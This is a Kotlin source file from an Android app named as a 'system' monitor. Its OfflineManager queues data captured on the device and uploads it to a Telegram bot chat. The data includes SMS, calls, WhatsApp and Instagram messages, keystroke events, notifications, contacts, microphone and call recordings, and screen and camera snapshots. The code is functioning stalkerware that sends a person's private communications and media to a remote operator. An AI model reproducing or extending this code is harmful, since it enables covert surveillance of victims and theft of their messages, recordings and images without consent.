package com.system.superiormonitor.bot

import android.content.Context
import android.net.Uri
import com.system.superiormonitor.data.PrefsManager
import com.system.superiormonitor.core.LogCategory
import com.system.superiormonitor.core.LogManager
import com.system.superiormonitor.core.LogLevel
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import java.io.File
import java.io.FileOutputStream
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

object OfflineManager {

    private val syncMutex = Mutex()

    enum class OfflineCategory {
        SNAPSHOTS,
        TEXT_LOGS,
        RECORDINGS
    }

    data class MediaItem(val file: File? = null, val uri: Uri? = null, val name: String, val docFile: androidx.documentfile.provider.DocumentFile? = null)

    /**
     * Appends a message text to an offline file (used by Sms, Call, WhatsApp monitors).
     */
    fun sendOrQueue(
        context: Context,
        message: String,
        offlineSubdir: String,
        offlineFileName: String,
        sender: (String, String?) -> Boolean
    ) {
        if (com.system.superiormonitor.core.LogManager.isTelegramApiReachable.value) {
            val success = sender(message, "Markdown")
            if (!success) {
                queueOnlyInternal(context, message, offlineSubdir, offlineFileName)
                LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]API unreachable during send. Update queued to $offlineSubdir.")
            }
        } else {
            queueOnlyInternal(context, message, offlineSubdir, offlineFileName)
            LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Device offline. Update queued to $offlineSubdir.")
        }
    }

    fun queueOnly(
        context: Context,
        message: String,
        offlineSubdir: String,
        offlineFileName: String
    ) {
        queueOnlyInternal(context, message, offlineSubdir, offlineFileName)
        LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Catch-up sync update queued to $offlineSubdir.")
    }

    private fun queueOnlyInternal(
        context: Context,
        message: String,
        offlineSubdir: String,
        offlineFileName: String
    ) {
        try {
            val offlineDir = File(context.getExternalFilesDir(null), "$offlineSubdir/offline")
            if (!offlineDir.exists()) offlineDir.mkdirs()
            val offlineFile = File(offlineDir, offlineFileName)
            offlineFile.appendText(message + "\n\n")
        } catch (e: Exception) {
            LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Error queueing offline update: ${e.message}", LogLevel.ERROR)
        }
    }

    /**
     * Unified pipeline for processing ALL offline files categorically.
     */
    fun processOfflineQueue(context: Context, scope: CoroutineScope, chatId: String? = null, messageId: Long? = null, botToken: String? = null) {
        scope.launch(Dispatchers.IO) {
            syncMutex.withLock {
                val prefs = PrefsManager.getInstance(context)
                val token = botToken ?: prefs.botToken
                val targetChatId = chatId ?: prefs.chatId

                if (!TelegramApi.isApiReachable(context, token)) {
                    LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS][Queue] Network unavailable during retrieval. Queue paused.", LogLevel.ERROR)
                    if (messageId != null && chatId != null) {
                        TelegramApi.editMessageText(token, targetChatId, messageId, "Network unavailable. Please try again later.")
                    }
                    return@withLock
                }

                LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Starting Unified Offline Sync Pipeline...")

                // 1. Process Text Logs (One by One)
                processTextLogs(context, token, targetChatId)

                // 2. Process Recordings (One by One)
                processRecordings(context, token, targetChatId)

                // 3. Process Snapshots (Batch if > 4)
                processSnapshots(context, token, targetChatId)

                // 4. Process WhatsApp Offline Media
                processWhatsAppMedia(context, token, targetChatId)
                
                LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Unified Offline Sync Pipeline Complete.")
            }
        }
    }

    private suspend fun processTextLogs(context: Context, token: String, chatId: String) {
        val textLogPaths = listOf(
            "call_alrt/offline/offline_calls.txt" to BotMessages.FetchOps.buildOfflineSyncCaption("Call", "calls were made during this period"),
            "sms_alrt/offline/offline_sms.txt" to BotMessages.FetchOps.buildOfflineSyncCaption("SMS", "SMS messages were received"),
            "whatsapp/offline/offline_whatsapp.txt" to BotMessages.FetchOps.buildOfflineSyncCaption("WhatsApp", "WhatsApp messages were received"),
            "wabusiness/offline/offline_wabusiness.txt" to BotMessages.FetchOps.buildOfflineSyncCaption("WABusiness", "WA Business messages were received"),
            "instagram/offline/offline_instagram.txt" to BotMessages.FetchOps.buildOfflineSyncCaption("Instagram", "Instagram DMs were received"),
            "keyevents/offline/offline_keyevents.txt" to BotMessages.FetchOps.buildOfflineSyncCaption("KeyEvents", "Key Events were recorded"),
            "app_installs/offline/offline_installs.txt" to BotMessages.FetchOps.buildOfflineSyncCaption("AppInstalls", "App installations/uninstallations were detected"),
            "notifications/offline/offline_notifications.txt" to BotMessages.FetchOps.buildOfflineSyncCaption("Notifications", "Notification events were intercepted")
        )

        for ((path, caption) in textLogPaths) {
            val file = File(context.getExternalFilesDir(null), path)
            if (file.exists() && file.length() > 0) {
                LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Found offline text log: ${file.name}. Uploading...")
                val success = com.system.superiormonitor.bot.MediaUploader.uploadDocument(context, token, chatId, file, "text/plain", caption, null)
                if (success) {
                    delay(2000)
                } else {
                    LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Failed to upload text log: ${file.name}. Retained locally.", LogLevel.ERROR)
                }
            }
        }

        // FetchOps contacts and calls
        val fetchDirs = listOf(
            File(context.getExternalFilesDir(null), "fetchops/contacts/offline") to "Offline Fetched Contacts Backup",
            File(context.getExternalFilesDir(null), "fetchops/calls/offline") to "Offline Fetched Call Activity Backup"
        )

        for ((dir, caption) in fetchDirs) {
            if (dir.exists() && dir.isDirectory) {
                dir.listFiles()?.filter { it.isFile && it.length() > 0 }?.forEach { file ->
                    LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Found offline FetchOps file: ${file.name}. Uploading...")
                    val success = com.system.superiormonitor.bot.MediaUploader.uploadDocument(context, token, chatId, file, "text/plain", caption, null)
                    if (success) {
                        delay(2000)
                    } else {
                        LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Failed to upload FetchOps file: ${file.name}. Retained locally.", LogLevel.ERROR)
                    }
                }
            }
        }
    }

    private suspend fun processRecordings(context: Context, token: String, chatId: String) {
        // 1. Mic Recordings
        val micDir = File(context.getExternalFilesDir(null), "mediaops/offline")
        if (micDir.exists() && micDir.isDirectory) {
            micDir.listFiles()?.filter { it.isFile && it.length() > 0 }?.forEach { file ->
                LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Found offline Mic recording: ${file.name}. Uploading...")
                val success = com.system.superiormonitor.bot.MediaUploader.uploadDocument(context, token, chatId, file, "audio/*", BotMessages.Alerts.buildOfflineMicCaption(), null)
                if (success) {
                    delay(2000)
                } else {
                    LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Failed to upload Mic recording: ${file.name}. Retained locally.", LogLevel.ERROR)
                }
            }
        }

        // 2. BCR Recordings (Call Recordings)
        val prefsManager = PrefsManager.getInstance(context)
        if (prefsManager.forwardRecordingEnabled) {
            val bcrRecordings = getOfflineBcrRecordings(context)
            if (bcrRecordings.isNotEmpty()) {
                LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Found ${bcrRecordings.size} offline BCR call recordings. Uploading one by one...")
                for ((docFile, filePath) in bcrRecordings) {
                    var originalFileName = filePath.split("/").lastOrNull() ?: "recording.opus"
                    val uri = docFile.uri
                    val mimeType = context.contentResolver.getType(uri) ?: "audio/mpeg"
                    val extension = android.webkit.MimeTypeMap.getSingleton().getExtensionFromMimeType(mimeType)
                    if (extension != null && !originalFileName.endsWith(".$extension")) {
                        originalFileName = "$originalFileName.$extension"
                    }
                    val caption = BotMessages.FetchOps.buildOfflineRecordingSyncedMessage(originalFileName)
                    val success = com.system.superiormonitor.bot.MediaUploader.uploadDocumentUri(
                        context = context,
                        token = token,
                        chatId = chatId,
                        uri = uri,
                        mimeType = mimeType,
                        fileName = originalFileName,
                        caption = caption
                    )
                    if (success) {
                        moveRecordingToPermanent(context, uri.toString(), filePath.split("/").toTypedArray(), mimeType, docFile)
                        delay(2000)
                    } else {
                        LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Failed to upload BCR recording: $originalFileName. Retained locally.", LogLevel.ERROR)
                    }
                }
            }
        }
    }

    private suspend fun processWhatsAppMedia(context: Context, token: String, chatId: String) {
        val variants = listOf("whatsapp", "wabusiness")
        for (variant in variants) {
            val zipDir = File(context.getExternalFilesDir(null), "$variant/offline")
            val mediaDir = File(zipDir, "media")
            val logPrefix = if (variant == "whatsapp") "WA" else "WA Business"
            com.system.superiormonitor.core.ZipManager.processOfflineMediaFolder(
                context, token, chatId, mediaDir, zipDir, logPrefix
            )
        }
    }

    private suspend fun processSnapshots(context: Context, token: String, chatId: String) {
        val snapshots = getOfflineSnapshots(context).toMutableList()
        if (snapshots.isEmpty()) return
        snapshots.sortBy { it.lastModified() }

        if (snapshots.size > 3) {
            LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Found ${snapshots.size} offline captures. Batching into ZIP...")
            TelegramApi.sendMessage(token, chatId, BotMessages.MediaOps.buildOfflineZipBatchingMessage(snapshots.size))
            delay(2000) // Delay to prevent Telegram API rate limits between message and zip
            val mediaItems = snapshots.map { MediaItem(file = it, name = it.name) }
            compressAndSendOfflineMedia(context, token, chatId, mediaItems, "offline_snapshots.zip", "Offline Snapshots Sync")
        } else {
            LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Found ${snapshots.size} offline snapshots. Uploading individually...")
            for (file in snapshots) {
                val success = com.system.superiormonitor.bot.MediaUploader.uploadPhoto(context, token, chatId, file, null, null)
                if (success) {
                    delay(2000)
                } else {
                    LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS][Queue] Upload failed for ${file.name}. Retained locally.", LogLevel.ERROR)
                }
            }
        }
    }

    private fun getOfflineSnapshots(context: Context): List<File> {
        val baseDirs = listOf(
            File(context.getExternalFilesDir(null), "captures/screen"),
            File(context.getExternalFilesDir(null), "captures/front"),
            File(context.getExternalFilesDir(null), "captures/rear")
        )
        val allOfflineFiles = mutableListOf<File>()
        for (baseDir in baseDirs) {
            if (!baseDir.exists() || !baseDir.isDirectory) continue
            val dateDirs = baseDir.listFiles { file ->
                file.isDirectory && file.name != "failed" && file.name != "permanent" && file.name != "temp"
            } ?: continue
            for (dateDir in dateDirs) {
                val offlineDir = File(dateDir, "offline")
                if (offlineDir.exists()) {
                    offlineDir.listFiles()?.filter { it.isFile }?.let { allOfflineFiles.addAll(it) }
                }
            }
        }
        return allOfflineFiles
    }

    private fun getOfflineBcrRecordings(context: Context): List<Pair<androidx.documentfile.provider.DocumentFile, String>> {
        val offlineRecordings = mutableListOf<Pair<androidx.documentfile.provider.DocumentFile, String>>()
        try {
            val bcrPrefs = com.chiller3.bcr.Preferences(context)
            val outputDirUri = bcrPrefs.outputDirOrDefault
            val userDir = try {
                androidx.documentfile.provider.DocumentFile.fromTreeUri(context, outputDirUri)
            } catch (e: Exception) { null } ?: androidx.documentfile.provider.DocumentFile.fromFile(File(outputDirUri.path ?: bcrPrefs.defaultOutputDir.absolutePath))
            
            userDir.listFiles().forEach { dateDir ->
                if (dateDir.isDirectory) {
                    val offlineDir = dateDir.findFile("offline")
                    if (offlineDir != null && offlineDir.isDirectory) {
                        offlineDir.listFiles().forEach { file ->
                            if (file.isFile && !file.name.isNullOrEmpty() && file.name?.endsWith(".json") != true && file.name?.endsWith(".txt") != true) {
                                offlineRecordings.add(Pair(file, dateDir.name + "/offline/" + file.name!!))
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) {
            LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Failed to query offline BCR recordings", LogLevel.ERROR)
        }
        return offlineRecordings
    }

    private suspend fun compressAndSendOfflineMedia(context: Context, token: String, chatId: String, items: List<MediaItem>, zipName: String, caption: String) {
        val zipFile = File(context.cacheDir, zipName)
        try {
            val zipItems = items.map { com.system.superiormonitor.core.ZipManager.ZipItem(name = it.name, file = it.file, uri = it.uri) }
            val successZip = com.system.superiormonitor.core.ZipManager.zipItems(context, zipItems, zipFile)

            if (successZip) {
                LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]ZIP created successfully with ${items.size} files. Uploading...")
                val success = com.system.superiormonitor.bot.MediaUploader.uploadDocument(context, token, chatId, zipFile, "application/zip", caption, null, false)
                
                if (success) {
                    LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]ZIP upload successful. Deleting ZIP and original files.")
                    // Zip file gets deleted in finally block
                    for (item in items) {
                        if (item.file != null) {
                            item.file.delete()
                        } else if (item.uri != null && item.file == null) {
                            val originalPath = item.name.split("/").toTypedArray()
                            val mimeType = context.contentResolver.getType(item.uri) ?: "audio/mpeg"
                            moveRecordingToPermanent(context, item.uri.toString(), originalPath, mimeType, item.docFile)
                        }
                    }
                } else {
                    LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]ZIP upload failed. ZIP deleted, but original files retained for next attempt.", LogLevel.ERROR)
                }
            } else {
                LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Failed to create ZIP file.", LogLevel.ERROR)
            }
        } catch (e: Exception) {
            LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Error during offline ZIP compression: ${e.message}", LogLevel.ERROR)
        } finally {
            if (zipFile.exists()) {
                zipFile.delete() // Always delete the zip file itself whether success or failure
            }
        }
    }

    suspend fun moveRecordingToPermanent(
        context: Context,
        fileUriString: String,
        originalPath: Array<String>,
        mimeType: String,
        docFile: androidx.documentfile.provider.DocumentFile? = null
    ) {
        val fileUri = Uri.parse(fileUriString)
        try {
            val bcrPrefs = com.chiller3.bcr.Preferences(context)
            val outputDirUri = bcrPrefs.outputDirOrDefault
            val userDir = try {
                androidx.documentfile.provider.DocumentFile.fromTreeUri(context, outputDirUri)
            } catch (e: Exception) { null } ?: androidx.documentfile.provider.DocumentFile.fromFile(File(outputDirUri.path ?: bcrPrefs.defaultOutputDir.absolutePath))
            
            val dateFolderName = originalPath.firstOrNull() ?: return
            var dateFolder = userDir.findFile(dateFolderName)
            if (dateFolder == null) dateFolder = userDir.createDirectory(dateFolderName)
            if (dateFolder == null) return
            
            var permanentFolder = dateFolder.findFile("permanent")
            if (permanentFolder == null) permanentFolder = dateFolder.createDirectory("permanent")
            if (permanentFolder == null) return
            
            val originalFileName = originalPath.lastOrNull() ?: "recording.opus"
            val newFile = permanentFolder.createFile(mimeType, originalFileName)
            if (newFile != null) {
                val inputStream = context.contentResolver.openInputStream(fileUri)
                val outputStream = context.contentResolver.openOutputStream(newFile.uri)
                if (inputStream != null && outputStream != null) {
                    val buffer = ByteArray(4096)
                    var bytesRead: Int
                    while (inputStream.read(buffer).also { bytesRead = it } != -1) {
                        kotlinx.coroutines.yield()
                        outputStream.write(buffer, 0, bytesRead)
                    }
                    outputStream.close()
                    inputStream.close()
                    
                    if (docFile != null) {
                        docFile.delete()
                    } else {
                        androidx.documentfile.provider.DocumentFile.fromSingleUri(context, fileUri)?.delete()
                    }
                    LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Moved BCR recording to permanent folder: $originalFileName")
                }
            }
        } catch (e: Exception) {
            LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Failed to move BCR recording to permanent folder: ${e.message}", LogLevel.ERROR)
        }
    }
}
